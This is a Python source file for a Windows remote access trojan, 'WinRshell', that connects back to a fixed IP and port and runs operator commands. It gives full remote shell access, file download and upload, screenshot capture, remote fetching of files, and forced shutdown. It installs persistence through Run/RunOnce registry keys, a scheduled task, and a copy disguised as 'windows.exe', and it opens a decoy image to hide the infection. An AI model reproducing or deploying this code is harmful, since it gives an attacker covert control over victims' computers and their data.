#!/usr/bin/env python
import socket
import subprocess
import json
import os
import sys
import shutil
import base64
import time
import requests
import getpass
import mss
import ctypes
from ctypes import wintypes

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to reliably send data over the socket
def reliable_send(data):
    """
    Sends data reliably over the socket by converting it to JSON and encoding it.
    """
    json_data = json.dumps(data)
    sock.send(json_data.encode())

# Function to reliably receive data from the socket
def reliable_recv():
    """
    Receives data reliably from the socket by continuously receiving and decoding until a valid JSON is received.
    """
    data = b""
    while True:
        try:
            data += sock.recv(1024)
            return json.loads(data.decode())
        except ValueError:
            continue

# Function to capture a screenshot using mss library
def screenshot():
    """
    Captures a screenshot of the target monitor using the mss library.
    """
    with mss.mss() as sct:
        sct.shot(output="monitor-1.png")

# Function to send the captured screenshot to the server
def send_screenshot():
    """
    Sends the captured screenshot to the server after encoding it as base64.
    """
    try:
        screenshot()
        with open("monitor-1.png", "rb") as screenshot_file:
            screenshot_data = screenshot_file.read()
            encoded_data = base64.b64encode(screenshot_data).decode()  # Encode the image data as base64
            reliable_send(encoded_data)
        os.remove("monitor-1.png")
    except Exception as e:
        error_message = f"[!!] Failed To Take A Screenshot: {str(e)}"
        reliable_send(error_message)

# Function to check if the script is running with administrative privileges
def is_admin():
    """
    Checks if the script is running with administrative privileges.
    """
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if is_admin:
            reliable_send("[+] Running as admin")
        else:
            reliable_send("[-] Not running as admin")
    except Exception as e:
        reliable_send(str(e))

# Function to download a file from a specified URL
def download(url):
    """
    Downloads a file from the specified URL and saves it to the current directory.
    """
    try:
        response = requests.get(url)
        if response.status_code == 200:
            file_name = url.split("/")[-1]
            with open(file_name, "wb") as file_data:
                file_data.write(response.content)
            reliable_send("[+] Downloaded File From Specified URL")
        else:
            reliable_send("[!!] Failed to download the file. Status code: {}".format(response.status_code))
    except requests.exceptions.RequestException as e:
        reliable_send("[!!] Failed to download the file. Error: {}".format(str(e)))

# Function to handle the shell commands
def shell():
    """
    Handles the shell commands received from the server and executes the corresponding actions.
    """
    while True:
        command = reliable_recv()
        if command.strip() == "q" or command.strip() == "quit":
            reliable_send("Closing connection...")
            try:
                continue
            except:
                pass
        elif command == "exit":
            break
        elif command[:7] =="sendall":
            subprocess.Popen(command[8:], shell=True)
        elif command == "help":
            help_options ='''
            download path --> Download A File From Target PC
            upload path   --> Upload A File To Target PC
            get url       --> Download A File To Target PC From The WEB
            start path    --> Start A Program On Target PC
            screenshot    --> Take A Screenshot Of Target Monitor
            isadmin       --> Checks For The Administrator Privileges
            q or quit     --> Exit The Shell
            '''
            reliable_send(help_options)

        elif command[:2] == "cd" and len(command) > 2:
            try:
                os.chdir(command[3:])
                current_dir = os.getcwd()
                reliable_send(current_dir)
            except PermissionError as e:
                reliable_send(str(e))
                continue
        elif command[:8] == "download":
            file_path = command[9:]
            try:
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    reliable_send(base64.b64encode(file_data).decode())
            except FileNotFoundError:
                reliable_send("File not found")
        elif command[:6] == "upload":
            file_path = command[7:]
            try:
                file_data = reliable_recv()
                with open(file_path, "wb") as file:
                    file.write(base64.b64decode(file_data.encode()))
                reliable_send("Upload successful")
            except Exception as e:
                reliable_send(str(e))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File From Specified URL")
            except:
                reliable_send("[!!] Failed To Download The Specified File")
        elif command[:10] == "screenshot":
            send_screenshot()

        elif command[:5] == "start":
            try:
                subprocess.Popen(command[:6], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[!!] Failed To Start!")
                
        elif command[:5] == "isadmin":
            try:
                is_admin_result = is_admin()
                reliable_send("Running with administrative privileges: {}".format(is_admin_result))
            except Exception as e:
                reliable_send(str(e))
        elif command.strip() == "restart":
            subprocess.call("shutdown /r /t 0", shell=True)
            reliable_send("Restarting...")
        elif command.strip() == "logoff":
            subprocess.call("shutdown /l", shell=True)
            reliable_send("Logging off...")
        elif command.strip() == "poweroff":
            subprocess.call("shutdown /s /t 0", shell=True)
            reliable_send("Powering off...")
        elif command.strip() == "isadmin":
            try:
                is_admin()
            except Exception as e:
                reliable_send(str(e))
        else:
            try:
                shell_process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                result = shell_process.stdout.read() + shell_process.stderr.read()
                result_str = result.decode()  # Decode the result to a string
                reliable_send(result_str)
            except Exception as e:
                reliable_send(str(e))

# Function to establish a connection with the server
def connection():
    """
    Establishes a connection with the server and starts the shell.
    """
    connected = False
    while not connected:
        try:
            sock.connect(("192.168.30.144", 5555))
            connected = True
        except:
            pass
            time.sleep(10)  # Wait for 10 seconds before attempting to reconnect

    shell()
    sock.close()

# Function to create a persistent task to run the script on system startup
def create_persistent_task():
    """
    Creates a persistent task to run the script on system startup using Task Scheduler.
    """
    # Get the username of the current user
    username = getpass.getuser()

    # Create the command to be executed by the task
    script_path = sys.argv[0]
    command = 'python "{}"'.format(script_path)

    # Create the task
    task_name = "WinRshell"
    task_xml = '''<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationInfo>
        <Date>2023-06-08T00:00:00</Date>
        <Author>{}</Author>
        <Description>WinRshell Task</Description>
      </RegistrationInfo>
      <Triggers>
        <LogonTrigger>
          <Enabled>true</Enabled>
        </LogonTrigger>
      </Triggers>
      <Principals>
        <Principal id="Author">
          <UserId>{}</UserId>
          <LogonType>InteractiveToken</LogonType>
        </Principal>
      </Principals>
      <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <StartWhenAvailable>false</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
          <StopOnIdleEnd>true</StopOnIdleEnd>
          <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>false</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
        <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
        <WakeToRun>true</WakeToRun>
        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
        <Priority>7</Priority>
      </Settings>
      <Actions Context="Author">
        <Exec>
          <Command>{}</Command>
        </Exec>
      </Actions>
    </Task>
    '''.format(username, username, command)

    # Save the task to a temporary XML file
    temp_xml_path = os.path.join(os.environ["TEMP"], "winrshell_task.xml")
    with open(temp_xml_path, "w") as f:
        f.write(task_xml)

    # Register the task with the Task Scheduler
    subprocess.call('schtasks /CREATE /TN {} /XML "{}"'.format(task_name, temp_xml_path), shell=True)

    # Delete the temporary XML file
    os.remove(temp_xml_path)


if __name__ == "__main__":
    # Check if the script is running for the first time and create a persistent task
    location = os.path.join(os.environ["appdata"], "windows.exe")
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinRshell /t REG_SZ /d "{}"'.format(location), shell=True)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Restart /t REG_SZ /d "shutdown /r /t 0"', shell=True)
        subprocess.call('reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WinRshell /t REG_SZ /d "{}"'.format(location), shell=True)
        subprocess.call('reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Restart /t REG_SZ /d "shutdown /r /t 0"', shell=True)
        create_persistent_task()

        file_name = sys._MEIPASS + "\\car.jpg" 
        #  inset the image name
        try:
            subprocess.Popen(file_name, shell=True)
        except:
            pass

    # Connect to the server and start the shell
    try:
        connection()
    except KeyboardInterrupt:
        exit(0)
